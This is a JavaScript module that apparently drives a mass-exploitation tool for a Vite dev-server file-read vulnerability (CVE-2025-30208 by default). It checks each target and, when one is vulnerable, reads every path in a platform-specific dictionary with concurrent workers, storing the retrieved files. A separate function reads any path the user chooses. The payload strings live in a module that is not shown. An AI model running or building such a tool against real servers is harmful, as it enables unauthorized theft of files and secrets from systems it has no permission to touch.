'use strict';

const viteScanner = require('./scanner/viteScanner');
const { resolveCve, listCves } = require('./scanner/payloads');
const { pathsFor } = require('./dict');

/** Run async `fn` over `items` with a bounded pool of `limit` workers. */
async function mapPool(items, limit, fn) {
  const results = [];
  let i = 0;
  const workers = new Array(Math.min(limit, items.length || 1))
    .fill(null)
    .map(async () => {
      while (i < items.length) {
        const idx = i++;
        results[idx] = await fn(items[idx], idx);
      }
    });
  await Promise.all(workers);
  return results;
}

/**
 * Verify a target and, if vulnerable, read every path in the selected list.
 * Updates the store as it goes.
 *
 * @param {import('./store').Store} store
 * @param {string} targetId
 * @param {object} options { cve, pathMode, concurrency, timeoutMs }
 */
async function scanTarget(store, targetId, options = {}) {
  const target = store.getById(targetId);
  if (!target) throw new Error('target not found');

  const cve = resolveCve(options.cve) || resolveCve('cve-2025-30208');
  const timeoutMs = options.timeoutMs || 10000;
  const concurrency = Math.max(1, Math.min(20, options.concurrency || 8));

  store.setStatus(target, 'scanning', null);

  const result = await viteScanner.verify(target.descriptor, cve.id, { timeoutMs });
  if (!result.vulnerable) {
    if (result.error) {
      store.setStatus(target, 'error', result.error);
    } else {
      store.setStatus(target, 'not_vulnerable', null);
    }
    target.lastScannedAt = new Date().toISOString();
    store.setVuln(target, null);
    return store.detail(targetId);
  }

  const vuln = {
    cve: result.cve,
    platform: result.platform,
    separator: result.separator,
    rootPath: result.rootPath,
    evidenceUrl: result.evidenceUrl,
  };
  store.setVuln(target, vuln);

  const paths = pathsFor(options.pathMode || 'default', result.platform);
  await mapPool(paths, concurrency, async (filePath) => {
    const file = await viteScanner.readFile(
      target.descriptor,
      cve.id,
      filePath,
      vuln,
      { timeoutMs }
    );
    if (file.ok) store.addFile(target, file);
    return file.ok;
  });

  store.setStatus(target, 'vulnerable', null);
  target.lastScannedAt = new Date().toISOString();
  return store.detail(targetId);
}

/**
 * Read a single, user-specified path from a target (verifies first if the
 * target has no recorded vuln info).
 */
async function readSinglePath(store, targetId, filePath, options = {}) {
  const target = store.getById(targetId);
  if (!target) throw new Error('target not found');
  const cve = resolveCve(options.cve) || resolveCve(target.vuln && target.vuln.cve) || resolveCve('cve-2025-30208');
  const timeoutMs = options.timeoutMs || 10000;

  let vuln = target.vuln;
  if (!vuln) {
    const result = await viteScanner.verify(target.descriptor, cve.id, { timeoutMs });
    if (!result.vulnerable) {
      return { ok: false, error: result.error || 'target not vulnerable' };
    }
    vuln = {
      cve: result.cve,
      platform: result.platform,
      separator: result.separator,
      rootPath: result.rootPath,
      evidenceUrl: result.evidenceUrl,
    };
    store.setVuln(target, vuln);
    store.setStatus(target, 'vulnerable', null);
  }

  const file = await viteScanner.readFile(
    target.descriptor,
    cve.id,
    filePath,
    vuln,
    { timeoutMs }
  );
  if (file.ok) {
    store.addFile(target, file);
    target.lastScannedAt = new Date().toISOString();
  }
  return file;
}

module.exports = { scanTarget, readSinglePath, listCves, mapPool };
